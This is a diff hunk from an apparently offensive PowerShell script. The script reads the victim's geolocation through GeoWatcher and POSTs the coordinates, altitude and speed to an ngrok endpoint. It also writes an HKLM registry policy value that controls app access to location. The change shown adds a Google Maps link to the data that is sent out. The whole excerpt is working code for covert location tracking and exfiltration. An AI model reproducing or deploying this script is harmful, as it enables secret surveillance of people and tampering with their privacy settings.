@@ -14,7 +14,7 @@ if ($GeoWatcher.Permission -eq 'Denied'){
     Write-Error 'Access Denied for Location Information'
 } else {
     $send = $GeoWatcher.Position.Location
-    $sendData = "Latitude: $($send.Latitude) `nLongitude: $($send.Longitude) `nAltitude: $($send.altitude) `nCourse: $($send.Course) `nHorizontalAccuracy: $($send.HorizontalAccuracy) `nSpeed: $($send.Speed)"
+    $sendData = "Latitude: $($send.Latitude) `nLongitude: $($send.Longitude) `nAltitude: $($send.altitude) `nCourse: $($send.Course) `nHorizontalAccuracy: $($send.HorizontalAccuracy) `nSpeed: $($send.Speed) `n`n[+] https://maps.google.com/?q=$($send.Latitude),$($send.Longitude)"
     Start-Sleep -Milliseconds 1000 
     Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $sendData
     Set-Itemproperty -path 'HKLM:\SOFTWARE\\Microsoft\PolicyManager\default\Privacy\LetAppsAccessLocation' -Name 'value' -Value '0'
